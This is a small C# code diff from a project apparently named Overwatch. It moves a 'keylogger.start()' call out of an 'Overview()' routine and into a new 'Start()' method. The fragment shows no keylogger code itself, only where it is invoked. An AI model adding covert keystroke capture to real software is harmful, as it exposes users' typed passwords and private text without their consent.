@@ -97,11 +97,12 @@ namespace Overwatch
             }
             catch (Exception ex) { Log.Write(ex.Message, true); }
         }
+        public void Start() { keylogger.start(); }
 
         public void Overview() {
             GeneralProcess();
             LocalProcess();
-            keylogger.start();
+            
         }
     }
 }
